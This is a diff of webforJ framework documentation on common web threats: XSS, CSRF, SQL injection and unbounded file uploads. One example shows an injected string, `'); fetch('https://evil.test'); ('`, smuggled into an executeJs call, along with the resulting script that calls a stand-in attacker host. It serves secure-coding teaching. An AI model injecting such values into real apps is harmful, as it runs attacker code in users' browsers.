@@ -1,10 +1,10 @@
 ---
 sidebar_position: 2
-title: Common threats
+title: Common Threats
 description: How common web threats such as cross-site scripting (XSS), cross-site request forgery (CSRF), and SQL injection apply to a webforJ app, what the framework handles, and where you stay responsible.
 ---
 
-Because a webforJ app runs in Java on the server and the browser only renders the interface (see [Client and server](/docs/architecture/client-server)), several classes of attack are contained by design. Others still depend on how you write your code. This page walks through the threats that matter most and draws a clear line between what webforJ handles and what's yours to handle.
+Because a webforJ app runs in Java on the server and the browser only renders the interface (see the [Client/Server Interaction](/docs/architecture/client-server) article), several classes of attack are contained by design. Others still depend on how you write your code. This page walks through the threats that matter most and draws a clear line between what webforJ handles and what's yours to handle.
 
 ## Cross-site scripting (XSS) {#cross-site-scripting-xss}
 
@@ -35,7 +35,7 @@ The same rule extends to the scripts you run on the client with `executeJs` and 
 el.executeJs("greet('" + name + "')");
 ```
 
-If `name` holds `'); fetch('https://evil.test'); ('`, the program the browser is asked to run becomes:
+If `name` holds `'); fetch('https://evil.test'); ('`, the browser runs the following program instead:
 
 ```js
 greet(''); fetch('https://evil.test'); ('')
@@ -69,6 +69,6 @@ webforJ sits nowhere near your data layer, so resistance to SQL injection rests 
 
 ## Unbounded file uploads {#unbounded-file-uploads}
 
-Accepting files of any size or quantity invites denial of service through exhausted memory, disk, or bandwidth. Cap what you accept on the upload components: they expose `setMaxFileSize` to limit each file and `setMaxFiles` to limit how many arrive at once.
+Accepting files of any size or quantity invites denial of service through exhausted memory, disk, or bandwidth. Cap what you accept on the upload components: they expose `setMaxFileSize()` to limit each file and `setMaxFiles()` to limit how many arrive at once.
 
 Treat that as the first line rather than the only one. A browser-side limit can be bypassed, so enforce a ceiling on the server as well: set `webforj.fileUpload.maxSize` in your [configuration](/docs/configuration/properties) to reject oversized uploads before they reach your code, and bound the maximum request size at your servlet container or reverse proxy.
